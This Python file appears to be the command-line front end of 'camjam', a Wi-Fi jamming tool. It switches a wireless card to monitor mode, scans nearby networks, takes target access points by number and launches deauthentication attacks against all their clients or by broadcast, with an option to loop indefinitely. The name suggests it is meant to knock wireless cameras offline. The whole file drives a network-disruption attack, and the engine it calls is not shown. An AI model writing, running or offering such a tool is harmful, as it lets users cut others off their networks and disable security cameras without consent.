"""Optional CLI — same engine as web, explicit --cli only."""

from camjam import config
from camjam.engine.session import AppSession
from camjam.store.models import DeauthMode, DeauthTarget


def run_cli() -> None:
    try:
        from art import text2art
        print(text2art("camjam", font="epic"))
    except Exception:
        print("CAMJAM v2 CLI")
    session = AppSession()
    session.ensure_root()
    session.ensure_tools()

    ifaces = session.radio.list_wifi_interfaces()
    if not ifaces:
        print("No wireless interfaces found.")
        return
    for i, iface in enumerate(ifaces, 1):
        print(f"  {i}: {iface}")
    choice = int(input("Interface # > "))
    iface = ifaces[choice - 1]
    mon = session.setup_interface(iface)
    print(f"Monitor: {mon}")

    import asyncio

    band = config.DEFAULT_BAND
    networks = asyncio.run(session.scan_networks(band))
    if not networks:
        return

    for idx, n in enumerate(networks, 1):
        print(f"{idx:3} ch{n['channel']:>3} {n['power']:>4} {n['bssid']} {n['ssid']}")

    sel = input("Target # (comma for multi) > ").strip()
    indices = [int(x.strip()) for x in sel.split(",") if x.strip()]
    targets = []
    for i in indices:
        n = networks[i - 1]
        targets.append(
            DeauthTarget(
                bssid=n["bssid"],
                ssid=n.get("ssid"),
                channel=int(n.get("channel") or 1),
                mode=DeauthMode.all_clients,
            )
        )

    mode = input("Mode [all_clients/ap_broadcast] > ").strip() or "all_clients"
    for t in targets:
        t.mode = DeauthMode(mode)

    loop = input("Loop? [y/N] > ").strip().lower() == "y"
    session.start_deauth(targets, loop=loop)
    input("Press Enter to stop…")
    session.shutdown()